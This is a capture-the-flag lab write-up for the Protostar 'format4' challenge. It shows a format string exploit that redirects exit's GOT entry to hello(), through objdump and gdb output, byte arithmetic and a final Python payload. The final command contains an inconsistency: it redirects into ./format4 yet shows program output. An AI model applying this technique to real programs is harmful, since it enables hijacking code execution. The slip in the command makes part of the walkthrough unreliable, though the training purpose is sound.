<h2>Goal</h2>
The goal of this challenge similar to the later stack challenges, we have to overwrite an EXIT with the `hello()` function address, but through a format string exploit.

<h2>Process</h2>
Let's start off by getting the addresses we need.

Using `objdump -TR` as suggested by the challenge we get the following:
```bash
/opt/protostar/bin$ objdump -TR format4

08049710 R_386_JUMP_SLOT   fgets
08049714 R_386_JUMP_SLOT   __libc_start_main
08049718 R_386_JUMP_SLOT   _exit
0804971c R_386_JUMP_SLOT   printf
08049720 R_386_JUMP_SLOT   puts
08049724 R_386_JUMP_SLOT   exit
```

`exit 08049724` is the address we will want over write.

Objdump can be used again to get the memory address of the hello function.

```bash
objdump -d format4 | grep hello
080484b4 <hello>:
```


Now we need to figure out where we can start changing memory. Use the same process as Format2 and Format3 to determine this. We end up with this:

```bash
python -c 'print "AAAA"+"%x "*4' | ./format4
AAAA200 b7fd8420 bffff614 41414141 
```

Next replace the `41414141` with the address of `\x24\x97\x04\x08`, which we want to overwrite. I will also jump ahead a bit here, replace `%x` with `%n` and add in the proper format for a full write.

```bash
python -c 'print "\x24\x97\x04\x08"+"\x25\x97\x04\x08"+"\x26\x97\x04\x08"+"\x27\x97\x04\x08"+"%4$n"+"%5$n"+"%6$n"+"%7$n"' | ./format4
$�%�&�'�
Segmentation fault
```

Last time format3 printed out the value we had overwritten and we could use it to determine what values to specify, this time it does not. We will have to go into gdb to get the correct values. Before going to gdb put the exploit output into a file so we can use it in gdb.

```bash
python -c 'print "\x24\x97\x04\x08"+"\x25\x97\x04\x08"+"\x26\x97\x04\x08"+"\x27\x97\x04\x08"+"%4$n"+"%5$n"+"%6$n"+"%7$n"' > /tmp/exp
```

`disas vuln` and set a break point at the exit so we can examine the value we are writing. `break *vuln+61`

In gdb with breakpoint set:

```bash
r < /tmp/exp
Starting program: /opt/protostar/bin/format4 < /tmp/exp
$�%�&�'�

Breakpoint 1, 0x0804850f in vuln () at format4/format4.c:22
22	format4/format4.c: No such file or directory.
	in format4/format4.c
    
#print out the value of the exit address.    
(gdb) x/1x 0x08049724
0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	0x10101010
```

Ok now for some math.  Since we are working with little endian we will be starting with the least significant byte of both the value of exit and value we want to overwrite it with.

Value of exit: `0x10101010`
Value we want to overwrite exit with: `0x080484b4`

GDB can do the math for us. Take the LSB of our desired value, `b4` and subtract the current LSB value of exit `10`

```bash
p 0xb4 - 0x10 
$1 = 164
```

Next is to subtract the second LSB `84` from the previous desired value, `64`

```bash
p 0x84 - 0xb4
$2 = -48
```
Notice the negative value. We cannot accept negative values, so add a 1 to the infront of the desired value, `0x184`

```bash
p 0x184 - 0xb4
$3 = 208
```

Continue on with the same process. Next `0x04 - 0x84`. We know that 84 is larger than 04, so we can add the 1 before the calculation
```bash
p 0x104 - 0x84
$4 = 128
```

```bash
p 0x108 - 0x04
$5 = 260
```

Now that we have all our values we can add each one to the exploit code. 
Example: `"%4n"` becomes `"%164x%4$n"`

<h2>Solution</h2>

```bash
python -c 'print "\x24\x97\x04\x08"+"\x25\x97\x04\x08"+"\x26\x97\x04\x08"+"\x27\x97\x04\x08"+"%164x%4$n"+"%208x%5$n"+"%128x%6$n"+"%260x%7$n"' > ./format4
$�%�&�'�                                                                                                                                                                 200                                                                                                                                                                                                        b7fd8420                                                                                                                        bffff614                                                                                                                                                                                                                                                             8049724
code execution redirected! you win
```
